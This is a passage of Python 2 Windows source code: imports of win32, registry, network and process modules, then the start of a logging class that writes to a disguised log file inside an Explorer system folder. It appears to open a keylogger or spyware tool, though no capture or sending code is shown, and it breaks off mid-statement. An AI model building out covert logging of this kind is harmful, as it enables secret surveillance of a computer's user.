import ctypes
import ctypes.util
import threading
import sqlite3
import os
import platform
import subprocess
import shutil
import sys
import tempfile
import time
import urllib2
import zipfile
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell, shellcon
from win32com.shell.shell import IsUserAnAdmin
from _winreg import *
try:
    import win32api
    import win32con
    import win32gui
    import win32process
except:
    pass

# Common

class Common:
    def __init__(self):
        self.logfile = 'C:\\Users\\%s\\AppData\\Local\\Microsoft\\Windows\\Explorer\\log.txt' % os.getenv('username')
        self.logging = False
        self.logging_lock = threading.Lock()
        self.logging_thread = None
        self.logging_stop_event = threading.Event()
        self.logging_timer = None
        self.logging_timer_lock = threading.Lock()
        self.logging_timer
